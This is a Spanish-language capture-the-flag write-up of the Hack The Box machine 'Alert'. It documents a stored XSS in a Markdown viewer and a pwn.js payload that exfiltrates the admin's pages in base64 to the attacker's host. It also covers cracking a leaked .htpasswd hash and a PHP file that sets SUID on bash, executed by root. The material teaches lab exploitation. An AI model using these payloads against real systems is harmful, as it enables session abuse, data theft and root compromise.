# Writeup: Alert (HTB)

**IP Máquina:** 10.129.63.24

**IP Atacante:** 10.10.17.184

***
## 1. Reconocimiento Activo

Iniciamos con un escaneo de puertos abiertos utilizando nmap:

```bash
nmap -p- --open -T5 -n -Pn -vvv 10.129.63.24 -oG targeted
```

![Pasted image 20260828122522](imgs%201/Pasted%20image%2020260828122522.png)

El escaneo muestra que los puertos 22 (SSH) y 80 (HTTP) están abiertos. Al detectar un servicio web, lanzamos un escaneo sobre el puerto 80 para identificar la versión y lanzar scripts básicos [...]

```bash
nmap -p80 -sCV 10.129.63.24 -oN service
```

![Pasted image 20260828122746](imgs%201/Pasted%20image%2020260828122746.png)

Identificamos un servidor Apache 2.4.41. Buscando esta versión exacta en Launchpad, muestra que el sistema operativo es Ubuntu Focal.

Aplicamos fuzzing de directorios para descubrir rutas ocultas. Usamos el script `http-enum` de Nmap y complementamos con Gobuster:

```bash
nmap --script http-enum -p80 10.129.63.24 -oN targeted
# Fuzzing con Gobuster
gobuster dir -u http://10.129.63.24 -w /usr/share/wordlists/dirb/common.txt
```

![gobuster_alert](imgs%201/gobuster_alert.png)

Añadimos el dominio `alert.htb` a nuestro `/etc/hosts` y accedemos a la web. Encontramos un visor de archivos Markdown.

![markdown_viewer](imgs%201/markdown_viewer.png)

Gobuster revela el directorio `messages.php`. Al intentar acceder, recibimos un error 403 Forbidden, lo que indica que está restringido, probablemente para uso exclusivo del administrador.

![messages_php](imgs%201/messages_php.png)

## 2. Explotación (XSS a LFI/Lectura de Archivos)

La web permite subir archivos `.md`. Esto es un vector clásico para ataques de Cross-Site Scripting (XSS) si el renderizador no sanitiza correctamente las etiquetas HTML. Subimos un payload bási[...]

```markdown
<script>
	alert(0)
</script>
```

Al visualizar el archivo subido, el script se ejecuta, confirmando la vulnerabilidad.

![alert_htb](imgs%201/alert_htb.png)

  
Al hacer clic en "Share Markdown", la aplicación genera una URL con nuestro archivo cifrado. En la sección "Contact us", se nos indica que cualquier enlace enviado será revisado directamente po[...]

Aprovecharemos este XSS para forzar al administrador a leer la página restringida `messages.php` y enviarnos su contenido.

1. Creamos el archivo `pwn.js` en nuestra máquina para realizar la petición y exfiltrar los datos en base64:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/index.php?page=messages', false);
req.send();

var filter = new XMLHttpRequest();
filter.open('GET', 'http://10.10.17.184/?b64=' + btoa(req.responseText), false);
filter.send();
```

2. Levantamos un servidor HTTP con Python para alojar el pwn.js:

```bash
python3 -m http.server 80
```

3. Creamos un archivo `test.md` que importe nuestro script malicioso:

```markdown
<script src="http://10.10.17.184/pwn.js"></script>
```

Subimos `test.md`, copiamos el enlace generado en "Share Markdown" y lo enviamos a través del formulario "Contact us".

![flujo_obtener_html](imgs%201/flujo_obtener_html.png)

En nuestro servidor Python, recibimos una petición GET con el contenido de `messages.php` codificado en Base64.

![registro_admin](imgs%201/registro_admin.png)

Decodificamos el string recibido:

```bash
echo -n "<BASE64_RECIBIDO>" | base64 -d
```

El contenido exfiltrado revela un archivo de contraseñas de Apache en la ruta `/var/www/statistics.alert.htb/.htpasswd`. Repetimos el ataque modificando el archivo `pwn.js` para que el administr[...]

Obtenemos el siguiente hash:

`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

Crackeamos el hash utilizando Hashcat y el diccionario `rockyou.txt`:

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt 
```

Contraseña obtenida: `manchesterunited`

## 3. Acceso Inicial y Escalada de Privilegios

Con las credenciales válidas, accedemos por SSH y leemos la flag del usuario:

```bash
ssh albert@10.129.63.24
# Password: manchesterunited
```

Revisamos los servicios internos a la escucha utilizando `ss -nltp` y detectamos el puerto 8080 abierto localmente. Realizamos un reenvío de puertos (Local Port Forwarding) para interactuar con [...]

Para ver procesos del sistema con la información completa:
```bash
ps -faux
# -f: formato completoo (id, pid, hh:ss)
# -a: todos los procesos, excepto los que estén asociados a una terminal
# -u: columna del usuario y la hora del CPU actualizada
# -x: procesos que no están controlados por una terminal (en segundo plano)
```


```bash
ssh albert@10.129.63.24 -L 8080:127.0.0.1:8080
```

Verificamos los grupos a los que pertenece el usuario `albert` con el comando `id`, destacando el grupo `management`. Buscamos archivos en el sistema que pertenezcan a este grupo:

```bash
find / -group management 2>/dev/null
```

Localizamos el directorio `/var/www/website-monitor/monitors`. Un `ls -l` revela que tenemos permisos de escritura en este directorio, cuyos archivos son ejecutados por `root` a través del servi[...]

Para escalar privilegios, creamos un script en PHP (`test.php`) que asigne permisos SUID al binario de bash:

```php
<?php
	system('chmod u+s /bin/bash');
?>
```

Como el puerto 8080 expone el contenido de `website-monitor`, navegamos o hacemos un `curl` a http://127.0.0.1:8080/monitors/test.php. El servidor ejecuta nuestro código como `root`, establecien[...]

Finalmente, lanzamos una bash privilegiada y leemos la flag de root:

```bash
bash -p
cat /root/root.txt
```
